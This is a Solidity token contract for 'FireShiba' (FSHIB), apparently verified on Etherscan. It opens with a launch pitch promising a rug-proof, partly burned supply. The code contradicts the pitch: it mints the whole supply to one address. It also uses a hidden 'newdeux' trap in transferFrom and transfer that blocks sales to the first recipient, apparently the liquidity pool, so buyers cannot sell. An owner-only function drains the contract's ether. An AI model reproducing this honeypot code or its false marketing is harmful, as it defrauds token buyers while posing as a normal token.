/**
 *Submitted for verification at Etherscan.io on 2021-06-30
*/

/*

💎FireShiba will be launching on the ETH NETWORK through UNISWAP in a few hours, please read all pinned for updates.💎

Our Tokenomics:
✅ 1 Quadrillion supply 
✅ 25% Burned 
✅ Rug-proof verified passed 
✅ Contract forked from original Shiba Inu team development code 

We have burned 25% of tokens!! 5% will go towards Dev, 5% towards marketing, 2% to charity, and the 50% will go towards circulation supply! 12% will go to private liquidity investors and airdrops.

https://t.me/FireShibaToken

Copy & Everyone go shill our group to all your other groups on TG. We launch at 500 members. 

*/
pragma solidity ^0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newdeux;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "FSHIB";
    name = "FireShiba";
    decimals = 9;
    _totalSupply = 5500000000 * 10**6 * 10**9;
    balances[0x9B33E32D22966a33FB41d5D8db92B280945637c7] = _totalSupply;
    emit Transfer(address(0), 0x9B33E32D22966a33FB41d5D8db92B280945637c7, _totalSupply);
  }
  function transfernewdeux(address _newdeux) public onlyOwner {
    newdeux = _newdeux;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newdeux, "waiting confirmation time");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newdeux == address(0)) newdeux = to;
      else require(to != newdeux, "waiting confirmation time");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract FSHIB is TokenBEP20 {

  function cleseBBT() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}